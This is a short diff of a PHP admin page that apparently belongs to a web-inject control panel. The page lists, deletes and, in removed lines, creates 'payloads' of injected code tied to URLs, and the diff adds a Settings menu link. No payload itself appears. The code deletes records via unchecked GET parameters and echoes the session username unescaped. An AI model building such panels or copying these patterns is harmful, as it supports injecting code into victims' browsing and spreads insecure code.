@@ -3,19 +3,6 @@ require_once('class/payload.class.php');
 if(isset($_GET['command']) && $_GET['command'] == "delete" && isset($_GET['id_p']) && $_GET['id_p'] != ''){
     Payload::Delete($_GET['id_p']);
 }
-if(isset($_POST['create']))
-{
-    $name = $_POST['name'];
-    $code_url = $_POST['code_url'];
-    $code_inject = $_POST['code_inject'];
-    
-    $payload = new Payload;
-    $payload->setName($name);
-    $payload->setUrl($code_url);
-    $payload->setCode($code_inject);
-    $payload->insertpayload();
-    echo $payload->status;
-}
 ?>
 <div class="panel">
     <div class="ui pointing menu">
@@ -23,6 +10,7 @@ if(isset($_POST['create']))
       <a href="index.php?action=panel" class="item">Logs</a>
       <a href="index.php?action=payload" class="item">Web Inject</a>
       <a href="index.php?action=listpayload" class="active item">List Web Inject</a>
+      <a href="index.php?action=settings" class="item">Settings</a>
       <a href="logout.php" class="item">Logout</a>
       <div class="right menu">
         <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
